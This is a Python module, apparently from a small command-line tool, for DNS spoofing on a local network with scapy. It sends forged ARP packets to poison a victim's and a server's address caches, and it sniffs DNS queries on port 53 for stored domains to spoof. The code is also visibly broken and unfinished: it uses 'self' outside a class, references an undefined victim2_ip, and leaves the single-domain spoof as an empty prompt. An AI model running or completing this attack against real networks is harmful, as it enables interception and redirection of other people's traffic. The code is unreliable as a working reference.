"""This package contains everything related to DNS spoofing"""

import click
from functions.general import *
from functions.domains import *
from scapy import *
from scapy.all import DNS, UDP, IP, DNSRR, DNSQR , sr1, send, sniff, sendp

interface = "UDP port 53"

domains = get_domains()

def spoof_dns(target_ip):
    click.echo("spoofing target using all stored domains")

    victim_mac = get_target_mac(target_ip)
    attacker_mac = get_my_mac()

    #Poisoning the Victim
    arp = Ether() / ARP()
    arp[Ether].src = attacker_mac
    arp[ARP].hwsrc = attacker_mac
    arp[ARP].psrc = victim2_ip
    arp[ARP].hwdst = victim_mac
    arp[ARP].pdst = self.victim1_ip

    sendp(arp, iface=self.interface_config.INTERFACE_NAME)

    #Poison the Server
    arp = Ether() / ARP()
    arp[Ether].src = attacker_mac
    arp[ARP].hwsrc = attacker_mac
    arp[ARP].psrc = self.victim1_ip
    arp[ARP].hwdst = victim_mac
    arp[ARP].pdst = self.victim2_ip

    sendp(arp, iface=self.interface_config.INTERFACE_NAME)


def spoof_dns_single():
    domain = click.prompt('Which domain do you want to spoof?')
    ip = click.prompt('Which IP should it route to?')


def analyze_packet(packet):
    # filter out answers
    if packet[DNS].qr != 0:
        return
    
    queried_name = packet[DNS].qd.qname[:-1].decode()
    
    if queried_name in domains:
        print(f'Found a query to spoof: {queried_name}')
        return
    
    print('other query')


def test():
    try:
        while True:
            sniff(filter='udp port 53', prn=analyze_packet)
    except KeyboardInterrupt:
        print("finito")
test()